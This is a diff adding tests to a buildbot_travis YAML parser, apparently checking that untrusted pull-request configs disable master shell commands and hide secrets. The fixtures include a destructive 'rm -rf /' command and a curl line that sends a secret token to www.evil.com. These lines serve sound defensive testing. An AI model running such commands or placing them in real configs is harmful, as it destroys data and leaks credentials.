@@ -12,15 +12,17 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-from __future__ import absolute_import
-from __future__ import division
-from __future__ import print_function
+from __future__ import absolute_import, division, print_function
 
 import yaml
 from twisted.trial import unittest
+from twisted.internet import defer
 
 from buildbot.plugins import steps, util
-from buildbot_travis.travisyml import TravisYml, TravisYmlInvalid
+from buildbot.process.properties import Properties
+from buildbot_travis.travisyml import (InterpolateNoSecrets,
+                                       StepDisabledWarning, TravisYml,
+                                       TravisYmlInvalid)
 
 
 class TravisYmlTestCase(unittest.TestCase):
@@ -88,6 +90,42 @@ class TestYamlParsing(TravisYmlTestCase):
         self.assertRaises(yaml.constructor.ConstructorError, yaml.load, """
             - !i foo
             """)
+
+    # untrusted tests
+    def test_with_trusted_master_shell_command(self):
+        self.t.parse("""
+        language: python
+        script:
+          - cmd: !MasterShellCommand ["rm -rf /"]
+        """)
+        self.failUnlessEqual(self.t.script, [{'cmd': steps.MasterShellCommand("rm -rf /")}])
+
+    def test_with_untrusted_master_shell_command(self):
+        self.t.parse("""
+        language: python
+        script:
+          - cmd: !MasterShellCommand ["rm -rf /"]
+        """, untrusted=True)
+        self.failUnlessEqual(self.t.script, [{'cmd': StepDisabledWarning('MasterShellCommand')}])
+
+    def test_with_untrusted_interpolate(self):
+        self.t.parse("""
+        language: python
+        script:
+          - cmd: !i "curl http://www.evil.com/?leaked=%(secret:HYPER_TOKEN)s"
+        """, untrusted=True)
+        self.failUnlessEqual(self.t.script, [
+            {'cmd': InterpolateNoSecrets(u'curl http://www.evil.com/?leaked=%(secret:HYPER_TOKEN)s')}])
+
+    def test_with_trusted_interpolate(self):
+        self.t.parse("""
+        language: python
+        script:
+          - cmd: !i "curl http://www.evil.com/?leaked=%(secret:HYPER_TOKEN)s"
+        """, untrusted=False)
+        self.failUnlessEqual(self.t.script, [
+            {'cmd': util.Interpolate(u'curl http://www.evil.com/?leaked=%(secret:HYPER_TOKEN)s')}])
+
 
 class TestEnv(TravisYmlTestCase):
 
@@ -335,3 +373,33 @@ class TestIrcNotifications(TravisYmlTestCase):
 
         self.assertEqual(self.t.irc.enabled, True)
         self.assertEqual(self.t.irc.channels, channels)
+
+
+class InterpolateNoSecretsTestCase(unittest.TestCase):
+
+    def setUp(self):
+        self.props = Properties(a='1')
+
+    @defer.inlineCallbacks
+    def test_prop(self):
+        r = InterpolateNoSecrets("%(prop:a)s")
+        res = yield self.props.render(r)
+        self.assertEqual(res, '1')
+
+    @defer.inlineCallbacks
+    def test_kw(self):
+        r = InterpolateNoSecrets("%(kw:b)s", b='2')
+        res = yield self.props.render(r)
+        self.assertEqual(res, '2')
+
+    @defer.inlineCallbacks
+    def test_secret(self):
+        r = InterpolateNoSecrets("%(secret:b:-none)s")
+        res = yield self.props.render(r)
+        self.assertEqual(res, 'none')
+
+    @defer.inlineCallbacks
+    def test_secret_no_repl(self):
+        r = InterpolateNoSecrets("%(secret:b)s")
+        res = yield self.props.render(r)
+        self.assertEqual(res, 'secrets are not accessible in pull request mode')
